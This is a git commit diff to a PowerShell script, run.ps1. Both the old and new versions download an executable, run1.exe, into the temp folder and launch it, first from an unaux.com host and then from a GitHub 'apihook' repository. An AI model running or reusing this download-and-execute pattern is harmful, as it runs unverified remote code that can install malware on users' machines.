34cd2232abca52f63788600c5b59da771efd9c05
Mayank Verma <mayank.1love@gmail.com>
2019-05-13 15:48:35 +0530

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -1,3 +1,2 @@
-Invoke-WebRequest -Uri 'http://dr.unaux.com/run1.exe' -OutFile $env:temp\run1.exe
-$args = @("Comma","Separated","Arguments")
-Start-Process -Filepath "$env:temp/run1.exe" -ArgumentList $args
+Invoke-WebRequest -Uri 'https://github.com/mayank1love/apihook/raw/master/run1.exe' -OutFile $env:temp\run1.exe
+Start-Process -Filepath "$env:temp/run1.exe"
